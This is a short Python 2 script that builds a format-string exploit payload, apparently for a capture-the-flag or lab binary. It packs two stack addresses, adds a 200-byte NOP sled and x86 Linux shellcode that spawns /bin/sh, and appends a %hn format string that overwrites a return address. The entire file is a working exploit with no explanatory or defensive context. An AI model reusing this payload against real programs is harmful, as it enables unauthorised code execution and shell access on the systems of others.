import struct

addr1 = struct.pack("I", 0xbffff4fc)
addr2 = struct.pack("I", 0xbffff4fe)
nopsled = "\x90" * 200
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
write = "%48918d%4$hn%13630d%5$hn"

print addr2 + addr1 + nopsled + shellcode + write